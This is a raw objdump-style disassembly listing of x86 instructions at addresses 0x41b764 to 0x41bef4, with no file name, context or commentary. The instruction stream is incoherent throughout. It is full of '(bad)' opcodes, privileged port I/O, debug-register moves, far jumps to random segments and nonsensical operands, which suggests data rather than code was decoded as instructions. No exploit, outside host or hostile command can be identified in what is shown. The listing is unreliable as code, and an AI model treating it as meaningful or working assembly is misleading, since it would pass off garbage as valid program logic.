  41b764:	xchg   edi,eax
  41b765:	retf   
  41b766:	and    ebp,DWORD PTR [ecx+0x3594b62e]
  41b76c:	jno    0x41b7c8
  41b76e:	ds sub al,0xa0
  41b771:	test   DWORD PTR [esp+edx*2-0x2f98c5b0],ebx
  41b778:	lds    ecx,FWORD PTR [ebx+0x1f]
  41b77b:	cs and al,0xb
  41b77e:	mov    bh,0x53
  41b780:	sbb    BYTE PTR [edx-0x3a],0xa9
  41b784:	pop    es
  41b785:	mov    eax,ds:0x2930ba6f
  41b78a:	xlat   BYTE PTR ds:[ebx]
  41b78b:	jnp    0x41b7f9
  41b78d:	into   
  41b78e:	in     eax,dx
  41b78f:	xchg   ecx,eax
  41b790:	in     eax,dx
  41b791:	cld    
  41b792:	pop    ss
  41b793:	pop    edx
  41b794:	js     0x41b732
  41b796:	cmp    ah,BYTE PTR [esi]
  41b798:	dec    ebp
  41b799:	mov    esi,0xbd51b937
  41b79e:	cmp    bh,dh
  41b7a0:	arpl   WORD PTR [ebp-0x6a48ed78],di
  41b7a6:	xchg   BYTE PTR [eax+edx*1],ch
  41b7a9:	sbb    eax,0xcbcbb1ce
  41b7ae:	shl    BYTE PTR [eax+esi*4+0x4286b706],cl
  41b7b5:	jge    0x41b793
  41b7b7:	push   esp
  41b7b8:	adc    esp,DWORD PTR [edi]
  41b7ba:	xchg   DWORD PTR [ebp+0x7],esi
  41b7bd:	rol    BYTE PTR [ecx+0x3b],cl
  41b7c0:	(bad)  
  41b7c1:	push   cs
  41b7c2:	dec    ebx
  41b7c3:	push   eax
  41b7c4:	cdq    
  41b7c5:	and    ah,BYTE PTR [edi-0x55f5a9ae]
  41b7cb:	clc    
  41b7cc:	or     ebx,DWORD PTR [ebx]
  41b7ce:	cdq    
  41b7cf:	and    al,BYTE PTR [esi]
  41b7d1:	mov    ecx,0xa65a209b
  41b7d6:	leave  
  41b7d7:	rcr    DWORD PTR [ebx],cl
  41b7d9:	or     al,0x1c
  41b7db:	pop    edx
  41b7dc:	loop   0x41b824
  41b7de:	sbb    eax,0x2aaf0027
  41b7e3:	sub    bl,bh
  41b7e5:	and    BYTE PTR [ecx],0xba
  41b7e8:	push   esi
  41b7e9:	mov    ebp,0x1a2c9c02
  41b7ee:	fild   WORD PTR [ebp+0x176cf807]
  41b7f4:	pop    eax
  41b7f5:	or     al,0x98
  41b7f7:	add    eax,0xde98d01b
  41b7fc:	ins    BYTE PTR es:[edi],dx
  41b7fd:	pushf  
  41b7fe:	sub    eax,0xd5418784
  41b803:	fisttp DWORD PTR [eax]
  41b805:	shl    esi,cl
  41b807:	icebp  
  41b808:	das    
  41b809:	xchg   DWORD PTR [eax-0x39fe3091],edi
  41b80f:	push   0xddf1b78f
  41b814:	add    cl,BYTE PTR [edx-0x7200c80]
  41b81a:	cmp    edi,DWORD PTR [ebx-0x65011506]
  41b820:	cdq    
  41b821:	rol    edi,cl
  41b823:	cmp    al,0xa
  41b825:	xor    cl,bl
  41b827:	xor    al,0x87
  41b829:	test   BYTE PTR [edx+ecx*2+0x36748c21],cl
  41b830:	sahf   
  41b831:	push   ebp
  41b832:	cmp    BYTE PTR [eax+0x1d37e23f],ch
  41b838:	stos   DWORD PTR es:[edi],eax
  41b839:	out    dx,al
  41b83a:	xchg   BYTE PTR [edx],ch
  41b83c:	scas   al,BYTE PTR es:[edi]
  41b83d:	xchg   edi,eax
  41b83e:	mov    al,0x8e
  41b840:	fcom   QWORD PTR [eax-0x39909c4e]
  41b846:	xchg   BYTE PTR [esi-0x6ebd5ae7],ah
  41b84c:	leave  
  41b84d:	mov    ch,0x49
  41b84f:	fsubp  st(4),st
  41b851:	push   cs
  41b852:	mov    edi,0xe0a341cd
  41b857:	shr    ah,1
  41b859:	mov    eax,ds:0x3837762e
  41b85e:	call   0x5366d439
  41b863:	jmp    0xc376:0x835f252b
  41b86a:	pop    ebx
  41b86b:	ss push ss
  41b86d:	jg     0x41b7fb
  41b86f:	mov    ah,0xba
  41b871:	dec    ecx
  41b872:	aad    0x66
  41b874:	scas   al,BYTE PTR es:[edi]
  41b875:	mov    edx,DWORD PTR [ebp+0x39]
  41b878:	loope  0x41b898
  41b87a:	test   BYTE PTR [ebx],al
  41b87c:	jnp    0x41b8e9
  41b87e:	pop    edi
  41b87f:	nop
  41b880:	hlt    
  41b881:	retf   0xf21b
  41b884:	push   ecx
  41b885:	or     BYTE PTR [ecx-0x23],al
  41b888:	sub    ax,0xa929
  41b88c:	xchg   edx,eax
  41b88d:	lods   al,BYTE PTR ds:[esi]
  41b88e:	stos   DWORD PTR es:[edi],eax
  41b88f:	push   eax
  41b890:	xchg   edx,eax
  41b891:	dec    ebx
  41b892:	xchg   edi,eax
  41b893:	mov    edi,0xdf1b10d6
  41b898:	push   0x5988e2f0
  41b89d:	adc    eax,DWORD PTR [edx-0x55]
  41b8a0:	(bad)  
  41b8a2:	xchg   ebp,eax
  41b8a3:	icebp  
  41b8a4:	or     DWORD PTR [edi-0x6a],eax
  41b8a7:	or     DWORD PTR [ebx+0x40],edx
  41b8aa:	adc    DWORD PTR [esi+0x4e],esp
  41b8ad:	loope  0x41b8b6
  41b8af:	mov    bh,0xa2
  41b8b1:	fadd   QWORD PTR [ecx+0x61089112]
  41b8b7:	fs popa 
  41b8b9:	call   DWORD PTR [edx-0x10e0b7d2]
  41b8bf:	pop    eax
  41b8c0:	icebp  
  41b8c1:	gs rcl al,1
  41b8c4:	loop   0x41b865
  41b8c6:	sub    eax,0x6b86ef2a
  41b8cb:	add    ecx,DWORD PTR [edi-0x7a]
  41b8ce:	rol    DWORD PTR [ecx],0xeb
  41b8d1:	dec    BYTE PTR [eax-0x3]
  41b8d4:	fstp   TBYTE PTR [edx]
  41b8d6:	jl     0x41b8e1
  41b8d8:	jb     0x41b8f9
  41b8da:	test   BYTE PTR [eax],0x28
  41b8dd:	xlat   BYTE PTR ds:[ebx]
  41b8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8df:	adc    DWORD PTR [edx],edi
  41b8e1:	dec    edi
  41b8e2:	or     ah,BYTE PTR [ecx+0x54395bf7]
  41b8e8:	das    
  41b8e9:	xchg   ecx,eax
  41b8ea:	jp     0x41b8eb
  41b8ec:	mov    cl,dh
  41b8ee:	mov    ebx,gs
  41b8f0:	aam    0x3d
  41b8f2:	mov    dh,0x26
  41b8f4:	push   ds
  41b8f5:	mov    bl,0x89
  41b8f7:	fnsave [esi]
  41b8f9:	nop
  41b8fa:	fcomp  QWORD PTR [ebx+0x15]
  41b8fd:	dec    eax
  41b8fe:	shr    DWORD PTR [edx-0x210204df],0x19
  41b905:	mov    ebp,0x23d81b9f
  41b90a:	mov    al,0x58
  41b90c:	je     0x41b8a5
  41b90e:	push   0xf2e2a031
  41b913:	or     BYTE PTR [ebp+0x23],bl
  41b916:	mov    ds:0xec8f9e8d,eax
  41b91b:	push   0x72bf0907
  41b920:	or     ah,BYTE PTR [ebx]
  41b922:	test   BYTE PTR [ecx-0x41a6d3f3],dl
  41b928:	ins    DWORD PTR es:[edi],dx
  41b929:	out    0xd4,al
  41b92b:	adc    eax,0x777d602a
  41b930:	sbb    eax,0xb5241bfc
  41b935:	out    0xf9,eax
  41b937:	out    0xc,eax
  41b939:	ds mov edx,0x4fe9fa2
  41b93f:	stos   DWORD PTR es:[edi],eax
  41b940:	not    DWORD PTR [esp+ebx*2-0xe]
  41b944:	imul   edi,DWORD PTR [edx+0x35336eda],0xfffffffa
  41b94b:	std    
  41b94c:	out    dx,al
  41b94d:	dec    esp
  41b94e:	push   edi
  41b94f:	inc    ebp
  41b950:	idiv   BYTE PTR es:[ecx-0x6]
  41b954:	ja     0x41b9b4
  41b956:	dec    ebp
  41b957:	sub    DWORD PTR [edx-0x38],esi
  41b95a:	pop    es
  41b95b:	cmp    edi,edx
  41b95d:	xor    dh,0xab
  41b960:	mov    DWORD PTR [eax+0x3945e9c],esi
  41b966:	pusha  
  41b967:	dec    ecx
  41b968:	(bad)  
  41b969:	fwait
  41b96a:	pop    esp
  41b96b:	xor    BYTE PTR [ebp+0x3c5533b2],bl
  41b971:	(bad)  
  41b972:	xor    DWORD PTR ds:0xc0f3b09a,ebx
  41b978:	add    eax,ebx
  41b97a:	cmp    al,0x74
  41b97c:	shl    BYTE PTR [esi+0xc330697],0xf
  41b983:	mov    al,ds:0xfdd4ba39
  41b988:	adc    esp,DWORD PTR [eax]
  41b98a:	ret    
  41b98b:	mov    esp,?
  41b98d:	mov    esi,0x83523f8d
  41b992:	mov    ecx,0xbec2728c
  41b997:	adc    BYTE PTR ds:0xa34fad9b,bh
  41b99d:	jne    0x41b92e
  41b99f:	xor    edi,eax
  41b9a1:	fidivr WORD PTR [edi+edx*8]
  41b9a4:	imul   ecx,DWORD PTR [edx-0x43],0xffffffee
  41b9a8:	cmp    BYTE PTR [edx],ch
  41b9aa:	cmp    eax,0x1c82003d
  41b9af:	gs jbe 0x41b9c4
  41b9b2:	add    DWORD PTR [ebx+0x2b1526a8],edi
  41b9b8:	in     eax,0xf3
  41b9ba:	dec    ebp
  41b9bb:	add    BYTE PTR [ecx+0x5a],ah
  41b9be:	not    DWORD PTR ds:0x6fb92676
  41b9c4:	or     DWORD PTR [edi],0x995f0cf0
  41b9ca:	xchg   DWORD PTR [edx+edi*1],esp
  41b9cd:	arpl   bp,sp
  41b9cf:	jae    0x41b9b2
  41b9d1:	shl    DWORD PTR [edi+0x3d1d1ca2],0x2a
  41b9d8:	and    ebx,DWORD PTR ds:[eax+0x4257f954]
  41b9df:	test   al,0xaa
  41b9e1:	pop    esp
  41b9e2:	and    bl,dh
  41b9e4:	ja     0x41ba51
  41b9e6:	push   ds
  41b9e7:	adc    DWORD PTR [ecx],0xe415c98
  41b9ed:	jno    0x41ba26
  41b9ef:	and    eax,0x44cdd79d
  41b9f4:	out    0xca,eax
  41b9f6:	mov    ah,0x97
  41b9f8:	sbb    BYTE PTR [ebx],bh
  41b9fa:	mov    edi,0xb3cd7b5
  41b9ff:	add    al,0x42
  41ba01:	sahf   
  41ba02:	(bad)  
  41ba03:	test   BYTE PTR [ecx+0x7035bb38],bh
  41ba09:	fisubr DWORD PTR [ebp+0x46]
  41ba0c:	mov    ah,0xca
  41ba0e:	xor    al,ch
  41ba10:	jg     0x41ba1c
  41ba12:	or     DWORD PTR [ebp+ebx*4+0x57],esi
  41ba16:	lods   eax,DWORD PTR ds:[esi]
  41ba17:	pop    esi
  41ba18:	ss jmp 0x41ba58
  41ba1b:	retf   
  41ba1c:	imul   ebp,DWORD PTR [ebx],0xffffffa3
  41ba1f:	fistp  DWORD PTR [eax-0x20]
  41ba22:	dec    ebp
  41ba23:	push   cs
  41ba24:	ss pop esp
  41ba26:	jnp    0x41ba9f
  41ba28:	rol    DWORD PTR [ebp+0x58344495],0x88
  41ba2f:	mov    edx,0x445f2195
  41ba34:	(bad)  
  41ba35:	jecxz  0x41ba44
  41ba37:	and    BYTE PTR [eax],ch
  41ba39:	in     al,dx
  41ba3a:	mov    ds:0xd22877c6,al
  41ba3f:	dec    edx
  41ba40:	add    dl,bl
  41ba42:	push   0xc8234d24
  41ba47:	xor    eax,esi
  41ba49:	rcl    ebx,1
  41ba4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba4c:	ins    BYTE PTR es:[edi],dx
  41ba4d:	sub    DWORD PTR [edx+0x2677f5c9],0x765e162b
  41ba57:	mov    ecx,0x6a27682
  41ba5c:	in     al,dx
  41ba5d:	dec    ebx
  41ba5e:	retf   0x1a5f
  41ba61:	shr    DWORD PTR [eax],1
  41ba63:	ins    BYTE PTR es:[edi],dx
  41ba64:	cli    
  41ba65:	push   ecx
  41ba66:	cwde   
  41ba67:	outs   dx,BYTE PTR ds:[esi]
  41ba68:	cmp    BYTE PTR [esp+ecx*8],bl
  41ba6b:	ins    DWORD PTR es:[edi],dx
  41ba6c:	xor    ebp,edi
  41ba6e:	xor    edx,esp
  41ba70:	and    al,0x60
  41ba72:	mov    BYTE PTR [edx],al
  41ba74:	lea    ebx,[ecx]
  41ba76:	stos   DWORD PTR es:[edi],eax
  41ba77:	or     ah,ch
  41ba79:	push   0xffffffba
  41ba7b:	mov    ecx,0xae309adc
  41ba80:	aas    
  41ba81:	inc    ebp
  41ba82:	jb     0x41ba72
  41ba84:	mov    esi,0xc5393a4b
  41ba89:	jno    0x41ba0f
  41ba8b:	jl     0x41bada
  41ba8d:	adc    eax,0xd418cc1a
  41ba92:	inc    esp
  41ba93:	std    
  41ba94:	push   esp
  41ba95:	sbb    eax,DWORD PTR [esi+0x3c]
  41ba98:	scas   eax,DWORD PTR es:[edi]
  41ba99:	mov    edx,0x8593da16
  41ba9e:	(bad)  [esi+0x1d]
  41baa1:	adc    al,0xba
  41baa3:	xor    dh,BYTE PTR [ebx+0x1a]
  41baa6:	pusha  
  41baa7:	pushf  
  41baa8:	pop    esp
  41baa9:	loop   0x41ba68
  41baab:	add    al,0x2b
  41baad:	sbb    dl,BYTE PTR [eax+0xf]
  41bab0:	or     DWORD PTR [edx],0x6d
  41bab3:	out    dx,al
  41bab4:	out    dx,eax
  41bab5:	or     edx,DWORD PTR [ebx]
  41bab7:	aam    0xb4
  41bab9:	test   DWORD PTR [ebp+0x56f55cb3],edi
  41babf:	lea    ecx,[ecx+0x31]
  41bac2:	add    eax,0x4d74ee85
  41bac7:	mov    ds:0x96c96196,eax
  41bacc:	(bad)  
  41bacd:	sahf   
  41bace:	cmp    ecx,DWORD PTR [ebx+eax*1-0x2d83074a]
  41bad5:	call   0x30c68ab2
  41bada:	mov    BYTE PTR ds:0x78b75b29,bl
  41bae0:	cli    
  41bae1:	mov    edi,0x4289fb2b
  41bae6:	call   0x4b2feece
  41baeb:	icebp  
  41baec:	xchg   esi,eax
  41baed:	mov    ch,0x3c
  41baef:	sysret 
  41baf1:	aam    0xdd
  41baf3:	mov    esi,0xefbba1bd
  41baf8:	(bad)  
  41baf9:	mov    edx,0xc6d09048
  41bafe:	icebp  
  41baff:	in     al,0xc5
  41bb01:	(bad)  
  41bb02:	xchg   ebp,eax
  41bb03:	in     eax,dx
  41bb04:	hlt    
  41bb05:	sbb    al,0x53
  41bb07:	mov    al,0xf2
  41bb09:	lock xor ebp,ecx
  41bb0c:	xchg   esp,eax
  41bb0d:	ds ret 0xd9ca
  41bb11:	fs pusha 
  41bb13:	push   esi
  41bb14:	pop    esp
  41bb15:	mov    WORD PTR [ebx],fs
  41bb17:	add    BYTE PTR [edx+0x5c],bl
  41bb1a:	push   0x86f5bade
  41bb1f:	std    
  41bb20:	into   
  41bb21:	sbb    al,0xef
  41bb23:	cld    
  41bb24:	cli    
  41bb25:	adc    eax,0xfb5f8b33
  41bb2a:	pop    esp
  41bb2b:	mov    esi,0x8852165f
  41bb30:	shr    DWORD PTR [ecx-0x706b7702],cl
  41bb36:	mov    esi,0xd38e60bf
  41bb3b:	rcl    edi,cl
  41bb3d:	inc    ebx
  41bb3e:	fdiv   DWORD PTR [di]
  41bb41:	mov    es,WORD PTR [esi-0x2f]
  41bb44:	push   edi
  41bb45:	or     eax,0xbe9e9c08
  41bb4a:	mov    edi,0xf39f65df
  41bb4f:	stc    
  41bb50:	mov    ecx,0x860f39e0
  41bb55:	je     0x41bbaa
  41bb57:	mov    esp,0x71b5a1be
  41bb5c:	retf   
  41bb5d:	push   ds
  41bb5e:	idiv   BYTE PTR [edx-0x5a]
  41bb61:	(bad)  
  41bb62:	mov    ebp,0xe022fbb5
  41bb67:	das    
  41bb68:	ins    BYTE PTR es:[edi],dx
  41bb69:	inc    edx
  41bb6a:	mov    eax,0xc4cb7ff
  41bb6f:	inc    eax
  41bb70:	inc    edi
  41bb71:	xor    al,0xa2
  41bb73:	rcl    DWORD PTR [esi],cl
  41bb75:	jge    0x41bb0a
  41bb77:	sub    eax,0xb51010e2
  41bb7c:	dec    esi
  41bb7d:	out    0xd6,al
  41bb7f:	pop    ds
  41bb80:	ja     0x41bb4b
  41bb82:	cdq    
  41bb83:	xchg   DWORD PTR fs:[esi],eax
  41bb86:	xchg   ebp,eax
  41bb87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb88:	cmp    ch,al
  41bb8a:	or     BYTE PTR [edx+0x68a373da],0x9f
  41bb91:	sbb    ch,BYTE PTR es:[eax+0x10329a2c]
  41bb98:	mov    dh,0x4e
  41bb9a:	xor    ebp,edx
  41bb9c:	out    0xdd,al
  41bb9e:	and    eax,0x586141d6
  41bba3:	popa   
  41bba4:	ret    
  41bba5:	in     eax,dx
  41bba6:	inc    ebx
  41bba7:	jl     0x41bbe2
  41bba9:	test   BYTE PTR [ebx-0x3ab5d57c],ah
  41bbaf:	(bad)  
  41bbb0:	jmp    0x41bb6d
  41bbb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbb3:	add    al,0x38
  41bbb5:	aas    
  41bbb6:	pop    eax
  41bbb7:	rep lods eax,DWORD PTR fs:[esi]
  41bbba:	xor    edi,edi
  41bbbc:	bound  esp,QWORD PTR [ecx+0x3d9f3922]
  41bbc2:	sub    BYTE PTR [esi],ch
  41bbc4:	xor    edx,DWORD PTR [esi-0x49b92128]
  41bbca:	inc    ebx
  41bbcb:	jle    0x41bb76
  41bbcd:	mov    ebp,0xb081b99b
  41bbd2:	pop    ebp
  41bbd3:	mov    WORD PTR [ebx+esi*1+0x2b],fs
  41bbd7:	mov    ch,0xd2
  41bbd9:	imul   ebx,DWORD PTR [ebp+0x19],0x850bb1b8
  41bbe0:	sbb    ecx,ebx
  41bbe2:	mov    WORD PTR [ecx],ds
  41bbe4:	loope  0x41bc27
  41bbe6:	es cwde 
  41bbe8:	and    bl,al
  41bbea:	ficomp DWORD PTR [ebp-0x78]
  41bbed:	and    dh,BYTE PTR [ebx]
  41bbef:	mov    eax,0xb42dd2a1
  41bbf4:	dec    esp
  41bbf5:	addr16 push eax
  41bbf7:	mov    edx,ebx
  41bbf9:	adc    eax,0x88de67e9
  41bbfe:	or     eax,0xac8419a
  41bc03:	int    0xd
  41bc05:	les    esi,FWORD PTR [eax]
  41bc07:	jl     0x41bbcd
  41bc09:	sbb    eax,DWORD PTR [esi+0x39d19552]
  41bc0f:	test   al,0xd9
  41bc11:	clc    
  41bc12:	loope  0x41bc60
  41bc14:	out    dx,eax
  41bc15:	pop    ecx
  41bc16:	loopne 0x41bc08
  41bc18:	(bad)  
  41bc1a:	mov    WORD PTR [ebp-0x6],cs
  41bc1d:	in     al,dx
  41bc1e:	les    ebp,FWORD PTR [ebx-0x3d]
  41bc21:	sbb    DWORD PTR [esi],ebp
  41bc23:	ret    
  41bc24:	jnp    0x41bc5e
  41bc26:	and    edx,ebx
  41bc28:	lock dec edi
  41bc2a:	ins    DWORD PTR es:[edi],dx
  41bc2b:	or     esp,esi
  41bc2d:	stos   DWORD PTR es:[edi],eax
  41bc2e:	jmp    0x41bc94
  41bc30:	nop
  41bc31:	push   esi
  41bc32:	xchg   esi,eax
  41bc33:	ins    BYTE PTR es:[edi],dx
  41bc34:	push   0x6c
  41bc36:	add    eax,0x45087832
  41bc3b:	stc    
  41bc3c:	out    dx,eax
  41bc3d:	jp     0x41bcba
  41bc3f:	mov    ebx,0x917d432d
  41bc44:	pop    ebp
  41bc45:	push   ebx
  41bc46:	push   ss
  41bc47:	cmp    eax,0xdc0b4595
  41bc4c:	lahf   
  41bc4d:	cld    
  41bc4e:	jge    0x41bca1
  41bc50:	push   edx
  41bc51:	mov    cl,0x17
  41bc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc54:	sub    al,0xb7
  41bc56:	(bad)  
  41bc58:	xor    al,BYTE PTR [ecx-0x1b2fdf9c]
  41bc5e:	je     0x41bc0b
  41bc60:	adc    bh,dl
  41bc62:	push   ebp
  41bc63:	into   
  41bc64:	sub    al,bl
  41bc66:	mov    eax,0x51f961ed
  41bc6b:	outs   dx,BYTE PTR ds:[esi]
  41bc6c:	mov    BYTE PTR [ebx+0x2d],0xe9
  41bc70:	inc    edx
  41bc71:	popa   
  41bc72:	(bad)  
  41bc73:	div    DWORD PTR [eiz*8+0x7f86f0f7]
  41bc7a:	adc    cl,BYTE PTR [esi*1-0x56af6e50]
  41bc81:	lahf   
  41bc82:	mov    ecx,0x8e3dbbd0
  41bc87:	stos   BYTE PTR es:[edi],al
  41bc88:	mov    ah,0xb0
  41bc8a:	std    
  41bc8b:	sub    BYTE PTR [ebx+0x16],0x97
  41bc8f:	repnz push 0x69
  41bc92:	div    esp
  41bc94:	inc    esp
  41bc95:	add    eax,0xdba48cac
  41bc9a:	out    0x92,eax
  41bc9c:	add    al,0x47
  41bc9e:	(bad)
  41bca1:	cmp    DWORD PTR [ebp+0x2b],ecx
  41bca4:	fisub  WORD PTR [ebx+0x2b1bac0f]
  41bcaa:	sub    BYTE PTR [edx-0x23770654],dh
  41bcb0:	call   0x1d2d3f34
  41bcb5:	add    BYTE PTR [ebp-0x27],dh
  41bcb8:	(bad)  
  41bcb9:	stos   BYTE PTR es:[edi],al
  41bcba:	sbb    ch,ah
  41bcbc:	mov    bl,0x4e
  41bcbe:	pop    ecx
  41bcbf:	repz and BYTE PTR [ebx],dl
  41bcc2:	mov    edi,0xe3bc9d3b
  41bcc7:	xchg   esi,eax
  41bcc8:	mov    eax,0x34c24ee5
  41bccd:	add    DWORD PTR [edi+edx*1+0x62],edx
  41bcd1:	rol    cl,0x70
  41bcd4:	adc    BYTE PTR [edx],cl
  41bcd6:	sbb    edi,ebx
  41bcd8:	nop
  41bcd9:	adc    DWORD PTR [esi+0x39],ebx
  41bcdc:	iret   
  41bcdd:	mov    cl,0x5e
  41bcdf:	xlat   BYTE PTR ds:[ebx]
  41bce0:	ret    0x6793
  41bce3:	adc    DWORD PTR [esi-0x6bdd7db2],esi
  41bce9:	dec    esp
  41bcea:	mov    dl,ah
  41bcec:	push   ebx
  41bced:	pop    eax
  41bcee:	loop   0x41bcdb
  41bcf0:	stc    
  41bcf1:	pop    eax
  41bcf2:	push   eax
  41bcf3:	dec    DWORD PTR [esi+0x7d]
  41bcf6:	jmp    0xfbe8:0x99010984
  41bcfd:	pop    esp
  41bcfe:	xchg   edx,eax
  41bcff:	sbb    al,0xfc
  41bd01:	(bad)  
  41bd02:	stc    
  41bd03:	in     eax,dx
  41bd04:	call   0x6373:0xd23619b7
  41bd0b:	mov    bh,0x7
  41bd0d:	xchg   DWORD PTR ds:0x841103e5,ebp
  41bd13:	push   ecx
  41bd14:	xor    al,0x9d
  41bd16:	les    esi,FWORD PTR [esi]
  41bd18:	arpl   WORD PTR [ecx+0x2ed48ca5],bx
  41bd1e:	(bad)  
  41bd20:	iret   
  41bd21:	rol    ebp,cl
  41bd23:	xor    eax,ebp
  41bd25:	or     eax,edi
  41bd27:	cld    
  41bd28:	std    
  41bd29:	hlt    
  41bd2a:	mov    ebp,0xe0129c53
  41bd2f:	xor    DWORD PTR [eax-0x50],eax
  41bd32:	add    esp,esi
  41bd34:	push   eax
  41bd35:	jp     0x41bd13
  41bd37:	push   ebx
  41bd38:	dec    eax
  41bd39:	jp     0x41bcde
  41bd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd3c:	and    BYTE PTR [ecx+0x8],cl
  41bd3f:	mov    ds:0x2d5782b3,eax
  41bd44:	popf   
  41bd45:	xchg   DWORD PTR [edi],ebx
  41bd47:	inc    esi
  41bd48:	dec    ecx
  41bd49:	lods   eax,DWORD PTR ds:[esi]
  41bd4a:	or     DWORD PTR [edx+eax*1],ebx
  41bd4d:	addr16 jp 0x41bd52
  41bd50:	add    ah,dl
  41bd52:	adc    al,0x48
  41bd54:	push   ss
  41bd55:	sub    ebp,DWORD PTR [esp+eax*2-0x2f]
  41bd59:	gs mov dh,0x0
  41bd5c:	fisub  WORD PTR [esi-0x433d1410]
  41bd62:	ja     0x41bd08
  41bd64:	pextrw edi,(bad),0xc5
  41bd66:	mov    edx,0x7f6fdc84
  41bd6b:	add    al,0x23
  41bd6d:	mov    edi,ebp
  41bd6f:	jmp    0x41bd20
  41bd71:	xchg   esp,eax
  41bd72:	add    dh,BYTE PTR [eax-0x5affd5bd]
  41bd78:	sub    eax,0x20596df7
  41bd7d:	jmp    0x41bd5e
  41bd7f:	fwait
  41bd80:	je     0x41bdf7
  41bd82:	pop    ebx
  41bd83:	pop    ebp
  41bd84:	cdq    
  41bd85:	mov    ah,0x63
  41bd87:	leave  
  41bd88:	mov    ecx,0x58058663
  41bd8d:	cmc    
  41bd8e:	popa   
  41bd8f:	mov    ah,0x5c
  41bd91:	ja     0x41bd74
  41bd93:	popf   
  41bd94:	push   edx
  41bd95:	int3   
  41bd96:	xor    ecx,esi
  41bd98:	(bad)  
  41bd99:	mov    ebx,0x549b0b4c
  41bd9e:	fwait
  41bd9f:	shl    esp,0xd0
  41bda2:	lods   al,BYTE PTR ds:[esi]
  41bda3:	or     ebp,DWORD PTR ds:[ebx-0x57]
  41bda7:	mov    eax,ds:0xc7a0cb2b
  41bdac:	jmp    0x41bdd1
  41bdae:	cmp    al,0x3d
  41bdb0:	jmp    0x41be16
  41bdb2:	ficomp WORD PTR [ebp+0x108e602f]
  41bdb8:	jmp    0x41bda1
  41bdba:	or     ebx,DWORD PTR [eax-0x49]
  41bdbd:	jbe    0x41be2c
  41bdbf:	xchg   esp,eax
  41bdc0:	mov    db4,ebp
  41bdc3:	jne    0x41bdf7
  41bdc5:	hlt    
  41bdc6:	inc    eax
  41bdc7:	repnz mov edx,0xbc676e9a
  41bdcd:	cdq    
  41bdce:	pop    ds
  41bdcf:	pop    ss
  41bdd0:	sub    eax,0xfd34ca5b
  41bdd5:	xor    BYTE PTR [esp+edx*1],dh
  41bdd8:	mov    al,ds:0x224f17c5
  41bddd:	sbb    BYTE PTR [ebx+0x4a8d88d2],ah
  41bde3:	fld    DWORD PTR [esi]
  41bde5:	stc    
  41bde6:	mov    ebx,0xda4b42d1
  41bdeb:	sub    al,0x10
  41bded:	xor    al,0xd3
  41bdef:	pop    edx
  41bdf0:	pop    ds
  41bdf1:	or     al,0x4f
  41bdf3:	push   0x5a0c3cfb
  41bdf8:	push   ebp
  41bdf9:	adc    BYTE PTR [ecx],bl
  41bdfb:	bound  ebp,QWORD PTR [eax+0x64]
  41bdfe:	outs   dx,BYTE PTR ds:[esi]
  41bdff:	dec    ebx
  41be00:	adc    DWORD PTR [ecx+0x26],ebp
  41be03:	repz push 0xfffffff9
  41be06:	sub    eax,0x13658609
  41be0b:	lods   eax,DWORD PTR ds:[esi]
  41be0c:	xchg   BYTE PTR [edx+0x663dc7df],bh
  41be12:	inc    ecx
  41be13:	sub    bh,BYTE PTR [edx-0x29475ec9]
  41be19:	scas   eax,DWORD PTR es:[edi]
  41be1a:	jmp    0x41bdb3
  41be1c:	es sbb ebp,edx
  41be1f:	pop    eax
  41be20:	jns    0x41be17
  41be22:	jmp    FWORD PTR [esi]
  41be24:	inc    ebx
  41be25:	mov    bh,0xbe
  41be27:	enter  0x1bcb,0x74
  41be2b:	hlt    
  41be2c:	mov    WORD PTR [esi+0x3207f7c],fs
  41be32:	es test esp,esp
  41be35:	push   DWORD PTR [edi]
  41be37:	xor    DWORD PTR [ebp-0x3526e539],esi
  41be3d:	push   0xdfc3f96d
  41be42:	mov    edx,0x7a40ed22
  41be47:	cdq    
  41be48:	ins    BYTE PTR es:[edi],dx
  41be49:	add    eax,0xc7eb0afa
  41be4e:	or     eax,0xd432ee3a
  41be53:	mov    eax,ds:0xcadf10a3
  41be58:	clc    
  41be59:	pop    ebp
  41be5a:	xchg   ecx,eax
  41be5b:	inc    edi
  41be5c:	aam    0xe8
  41be5e:	mov    ds:0xd86877ad,al
  41be63:	imul   BYTE PTR [edx]
  41be65:	dec    ebp
  41be66:	leave  
  41be67:	loop   0x41beae
  41be69:	bound  edx,QWORD PTR [edx-0xb]
  41be6c:	add    esi,0x6627db08
  41be72:	fxch   st(1)
  41be74:	pop    ecx
  41be75:	nop
  41be76:	in     al,0x7e
  41be78:	test   cl,cl
  41be7a:	mov    ecx,0xb5d057bd
  41be7f:	popf   
  41be80:	adc    ebx,esp
  41be82:	stos   DWORD PTR es:[edi],eax
  41be83:	arpl   WORD PTR [ebx-0x76],cx
  41be86:	push   esi
  41be87:	xchg   esi,eax
  41be88:	ror    DWORD PTR [edx+0x3faec1cf],1
  41be8e:	push   eax
  41be8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be90:	mov    BYTE PTR [esi+0x31],al
  41be93:	mov    ds:0x6eca6dae,al
  41be98:	fchs   
  41be9a:	loop   0x41be70
  41be9c:	mul    ch
  41be9e:	repz in al,0x8
  41bea1:	nop
  41bea2:	sti    
  41bea3:	add    bh,BYTE PTR [eax+0x1b]
  41bea6:	or     eax,0x6a6094e2
  41beab:	push   esp
  41beac:	ret    
  41bead:	fsub   st(5),st
  41beaf:	inc    eax
  41beb0:	sub    eax,0xca1fe341
  41beb5:	imul   ecx,esi,0xb9feac69
  41bebb:	shl    DWORD PTR [ebp+0x1df666c7],1
  41bec1:	push   ds
  41bec2:	add    DWORD PTR gs:[esi-0x58],0xae0cc67b
  41beca:	jns    0x41bf3c
  41becc:	and    BYTE PTR [ebx-0x42bcdf50],dl
  41bed2:	xor    al,0x12
  41bed4:	fs mov cl,0x91
  41bed7:	dec    ebx
  41bed8:	fmul   QWORD PTR [ecx+0x6ebe70db]
  41bede:	lock rcl BYTE PTR [eax-0x4e2c58fc],cl
  41bee5:	retf   
  41bee6:	pop    ss
  41bee7:	(bad)  
  41bee8:	mov    ds:0xdcbb253b,al
  41beed:	jae    0x41bf5e
  41beef:	mov    esp,0xdde0daae
  41bef4:	(bad)  
